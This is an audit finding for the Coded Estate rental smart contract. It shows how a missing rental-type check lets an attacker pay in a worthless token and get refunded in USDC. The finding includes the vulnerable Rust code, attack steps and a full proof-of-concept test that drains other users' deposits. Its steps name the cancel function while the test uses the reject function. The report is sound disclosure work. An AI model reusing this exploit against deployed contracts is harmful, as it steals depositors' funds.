---
tags:
  - lang/rust
  - lang/solidity
  - sector/options
  - sector/stable
  - platform/code4rena
  - has/github
  - severity/high
  - impact/loss-of-funds/direct-drain
  - novelty/variant
protocol: "[[Coded Estate]]"
auditors:
  - "[[nnez]]"
report: "https://code4rena.com/reports/2024-10-coded-estate"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[variant]]"
  - "[[cross-contract-state-consistency]]"
---
# [H-04] Lack of differentiation between rental types leads to loss of funds

- id: 45191
- impact: HIGH
- protocol: [[Coded Estate]]
- reporter: nnez (Code4rena)
- source: https://code4rena.com/reports/2024-10-coded-estate

## Summary


This bug report describes a vulnerability in the CodedEstate system that allows an attacker to exploit the lack of distinction between short-term and long-term rental types. This vulnerability can be used to withdraw funds in a different, more valuable token than the one initially used for payment, effectively stealing other users' funds deposited in the contract. The issue lies in the fact that the contract does not make use of a flag meant to differentiate between short-term and long-term rentals, allowing functions designated for one type to be used for the other without proper validation. This can be exploited by listing a short-term rental using a low-value token, then cancelling it using a long-term rental's function, resulting in a refund in the higher-value token. A proof-of-concept test has been provided to demonstrate this vulnerability. The recommended mitigation is to utilize the `rental_type` flag to differentiate between rental types and enforce the usage of functions according to its type. This vulnerability has been confirmed by the Coded Estate team and has been assessed as an issue with Invalid Validation.

## Details


<https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1413>

<https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L870>

### Impact

This vulnerability allows an attacker to exploit the lack of distinction between short-term and long-term rental types to withdraw funds in a different, more valuable token than the one initially used for payment, effectively steal other users' funds deposited in the contract.

### Description

In the CodedEstate system, a property (token) can be listed for both **short-term** and **long-term** rentals, with each rental type having separate configurations; including the denomination (`denom`) of the token used for payments. The rental information for both types of rentals is stored in the same vector, `rentals`, and a `rental_type` flag is used within the `Rental` struct to differentiate between short-term (`false`) and long-term (`true`) rentals.

```rust
File: packages/cw721/src/query.rs
pub struct Rental {
    pub denom: String,
    pub deposit_amount: Uint128,
    pub rental_type: bool,  // @c4-contest: differentiates between short-term (false) and long-term (true) rentals
    pub cancelled: bool,
    pub renting_period: Vec<u64>,
    pub address: Option<Addr>,
    pub approved: bool,
    pub approved_date: Option<String>,
    pub guests: usize,
}

File: contracts/codedestate/src/execute.rs
pub struct TokenInfo<T> {
    pub owner: Addr,
    pub approvals: Vec<Approval>,
    pub longterm_rental: LongTermRental, // long-term rental agreement
    pub shortterm_rental: ShortTermRental, // short-term rental agreement
    pub rentals: Vec<Rental>, // @c4-contest: both types of rental are saved in this vector
    pub bids: Vec<Bid>,
    pub sell: Sell,
    pub token_uri: Option<String>,
    pub extension: T,
}
```

However, the contract does not make use of the `rental_type` flag in any function that handles rental operations. As a result, functions designated for short-term rentals can be used for long-term rentals, and vice versa, without proper validation of the rental type. This becomes problematic, especially since short-term and long-term rentals may use different `denom` tokens.

```rust
File: contracts/codedestate/src/execute.rs
pub fn setlistforshorttermrental(
// function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_approve(deps.as_ref(), &env, &info, &token)?;
    self.check_can_edit_short(&env, &token)?;

    token.shortterm_rental.islisted = Some(true);
    token.shortterm_rental.price_per_day = price_per_day;
    token.shortterm_rental.available_period = available_period;
    token.shortterm_rental.auto_approve = auto_approve;
    token.shortterm_rental.denom = denom; // @c4-contest <-- can be a different denom from long-term rental
    token.shortterm_rental.minimum_stay = minimum_stay;
    token.shortterm_rental.cancellation = cancellation;
    self.tokens.save(deps.storage, &token_id, &token)?;

    Ok(Response::new()
        .add_attribute("action", "setlistforshorttermrental")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}

pub fn setlistforlongtermrental(
// function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_approve(deps.as_ref(), &env, &info, &token)?;
    self.check_can_edit_long(&env, &token)?;

    token.longterm_rental.islisted = Some(true);
    token.longterm_rental.price_per_month = price_per_month;
    token.longterm_rental.available_period = available_period;
    token.longterm_rental.auto_approve = auto_approve;
    token.longterm_rental.denom = denom; // @c4-contest <-- can be a different denom from short-term rental
    token.longterm_rental.minimum_stay = minimum_stay;
    token.longterm_rental.cancellation = cancellation;
    self.tokens.save(deps.storage, &token_id, &token)?;

    Ok(Response::new()
        .add_attribute("action", "setlistforlongtermrental")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}
```

An attacker can exploit this by performing the following steps:\
Supposed there are two legitimate tokens in on Nibiru chain (deployment chain), `TokenX ~ $0.01 and USDC ~ $1`.

1. List a short-term rental using a low-value token (e.g., TokenX).
2. List a long-term rental using a high-value token (e.g., USDC).
3. Reserve a short-term rental by paying in TokenX using short-term function `setreservationforshortterm`.
4. Cancel the short-term rental using the long-term rental's cancellation function `cancelreservationbeforeapprovalforlongterm`, which refunds in USDC.

This results in the attacker receiving a refund in the higher-value token, effectively stealing funds from other users who deposited USDC.

<details>

```rust
pub fn setreservationforshortterm(
// function arguments
) -> Result<Response<C>, ContractError> {
    ...
    ... snipped
    ...

    // @c4-contest: token with shortterm_rental denom
    if info.funds[0].denom != token.shortterm_rental.denom {
        return Err(ContractError::InvalidDeposit {});
    }
    let sent_amount = info.funds[0].amount;
    let fee_percentage = self.get_fee(deps.storage)?;
    let rent_amount = token.shortterm_rental.price_per_day
    * (new_checkout_timestamp - new_checkin_timestamp)/(86400);
    if sent_amount
        < Uint128::from(rent_amount) + Uint128::new((u128::from(rent_amount) * u128::from(fee_percentage)) / 10000)
    {
        return Err(ContractError::InsufficientDeposit {});
    }

    self.increase_balance(deps.storage, info.funds[0].denom.clone(), sent_amount - Uint128::from(rent_amount))?;

    let traveler = Rental {
        denom:token.shortterm_rental.denom.clone(),
        rental_type:false,
        approved_date:None,
        deposit_amount: Uint128::from(rent_amount),
        renting_period: vec![new_checkin_timestamp, new_checkout_timestamp],
        address: Some(info.sender.clone()),
        approved: token.shortterm_rental.auto_approve,
        cancelled:false,
        guests:guests,
    };

    token
        .rentals
        .insert(placetoreserve as usize, traveler); // @c4-contest: rental is saved into rentals vector

    ...
    ... snipped
    ...
}

pub fn cancelreservationbeforeapprovalforlongterm(
// function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    let mut position: i32 = -1;
    let mut amount = Uint128::from(0u64);
    let tenant_address = info.sender.to_string();
    // @c4-contest: rental is loaded from rentals vector
    for (i, item) in token.rentals.iter().enumerate() {
        if item.address == Some(info.sender.clone()) && item.renting_period[0].to_string() == renting_period[0]
        && item.renting_period[1].to_string() == renting_period[1]
            {
            if item.approved_date.is_some() {
                return Err(ContractError::ApprovedAlready {});
            } else {
                position = i as i32;
                amount = item.deposit_amount;
            }
        }
    }

    if position == -1 {
        return Err(ContractError::NotReserved {});
    }
    else {
        token.rentals.remove(position as usize);
        self.tokens.save(deps.storage, &token_id, &token)?;
    }

    if amount > Uint128::new(0) {
        Ok(Response::new()
        .add_attribute("action", "cancelreservationbeforeapprovalforlongterm")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: tenant_address,
            amount: vec![Coin {
                denom: token.longterm_rental.denom, // @c4-contest: Funds are sent back in long-term denom according to long-term rental agreement
                amount: amount, // @c4-contest: deposit_amount is loaded from saved short_term rental
            }],
        }))
    }
    else {
        Ok(Response::new()
        .add_attribute("action", "cancelreservationbeforeapprovalforlongterm")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
    } 
}
```

</details>

### Proof-of-Concept

The following test demonstrates the described attacker scenario.

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

<details>

```rust
#[test]
fn h8_shorterm_longterm_denom(){
    const ATTACKER: &str = "attacker";
    const ATTACKER_USELESS_DENOM: &str = "useless-coin";

    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Attacker mints a new token
    execute_mint(&mut app, &contract_addr, ATTACKER, TOKEN_ID);
    // Attacker list new short term rental, specifying useless token as denom
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForShortTermRental { 
        token_id: TOKEN_ID.to_string(), 
        denom: ATTACKER_USELESS_DENOM.to_string(), 
        price_per_day: 1000, 
        auto_approve: true, 
        available_period: vec![], 
        minimum_stay: 1, 
        cancellation: vec![]
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &[],
    );
    assert!(res.is_ok());

    // Attacker list new long term rental, specifying USDC as denom
    let list_long_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForLongTermRental { 
        token_id: TOKEN_ID.to_string(),
        denom: USDC.to_string(),
        price_per_month: 1000,
        auto_approve: true,
        available_period: vec![0.to_string(),1640995200.to_string()], // 1 year availability
        minimum_stay: 0,
        cancellation: vec![],
    };
    app.execute_contract(Addr::unchecked(ATTACKER), contract_addr.clone(), &list_long_term_rental_msg, &[]).unwrap();

    // Simulate some balances
    // Attacker initially has 1000 useless tokens
    // Contract intially has 10_000 USDC (from users' deposited)
    init_denom_balance(&mut app, ATTACKER, ATTACKER_USELESS_DENOM, 1000);
    init_usdc_balance(&mut app, &contract_addr.to_string(), 10_000);

    // Attacker reserves short term rental on his own token, paying 1000 useless token
    let tmr = app.block_info().time.plus_days(1);
    let reserve_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetReservationForShortTerm { 
        token_id: TOKEN_ID.to_string(), 
        renting_period: vec![tmr.seconds().to_string(), tmr.plus_days(1).seconds().to_string()], 
        guests: 0
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &reserve_short_term_rental_msg,
        &vec![Coin {
            denom: ATTACKER_USELESS_DENOM.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok());

    // Attacker rejects their own reservation through rejectreservationlongterm function
    // Note that attacker never make a reservation for a long term rental
    let reject_reservation_long_term_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::RejectReservationForLongterm {
        token_id: TOKEN_ID.to_string(),
        tenant: ATTACKER.to_string(),
        renting_period: vec![tmr.seconds().to_string(), tmr.plus_days(1).seconds().to_string()]
    };

    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &reject_reservation_long_term_msg,
        &vec![],
    );

    assert!(res.is_ok());

    // Attacker gets 1000 USDC as refund, leaving 1000 useless tokens in the contract
    assert_eq!(query_denom_balance(&app, ATTACKER, USDC), 1000);
    // Asserts that conctract loses 1000 USDC to Attacker
    assert_eq!(query_denom_balance(&app, &contract_addr.to_string(), USDC), 9000);

    assert_eq!(query_denom_balance(&app, ATTACKER, ATTACKER_USELESS_DENOM), 0);
    assert_eq!(query_denom_balance(&app, &contract_addr.to_string(), ATTACKER_USELESS_DENOM), 1000);
}
```

</details>

3. Run `cargo test h8_shorterm_longterm_denom -- --nocapture`.
4. Observe that the test passes, indicating that the described scenario is valid.

### Recommended Mitigation

Utilize `rental_type` flag to differentiate between short-term and long-term rental and enforce usage of functions according to its type.

### Assessed type

Invalid Validation

**[blockchainstar12 (Coded Estate) confirmed](https://github.com/code-423n4/2024-10-coded-estate-findings/issues/7#event-14639070941)**

***
